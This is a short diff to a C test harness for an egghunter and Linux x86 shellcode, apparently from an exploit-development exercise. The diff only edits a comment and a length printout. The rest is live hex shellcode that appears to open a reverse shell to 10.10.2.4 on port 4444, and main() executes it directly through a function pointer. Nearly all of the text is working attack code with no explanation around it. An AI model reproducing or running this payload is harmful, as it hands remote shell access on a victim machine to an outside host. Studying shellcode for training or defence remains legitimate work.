@@ -7,7 +7,7 @@ unsigned char egghunter[] = \
 "\xd7\xaf\x75\xe8\xff\xe7";
 
 unsigned char egg[] = \
-"\x50\x90\x50\x90" // egg mark - do not remove
+"\x50\x90\x50\x90" // egg signature
 "\x31\xc0\xb0\x66\x31\xdb\x43\x31\xf6\x56\x53\x6a\x02\x89\xe1"
 "\xcd\x80\x97\x31\xc0\xb0\x66\x43\x68\x0a\x0a\x02\x04\x66\x68"
 "\x11\x5c\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\x43\xcd\x80"
@@ -18,7 +18,7 @@ unsigned char egg[] = \
 void main()
 {
     printf("Egg hunter length: %d\n", strlen(egghunter));
-    printf("Shellcode length + 4 byte egg: %d\n", strlen(egg));
+    printf("Shellcode length: %d (%d + 4 byte egg)\n", strlen(egg), strlen(egg)-4);
     int (*ret)() = (int(*)())egghunter;
     ret();
 }
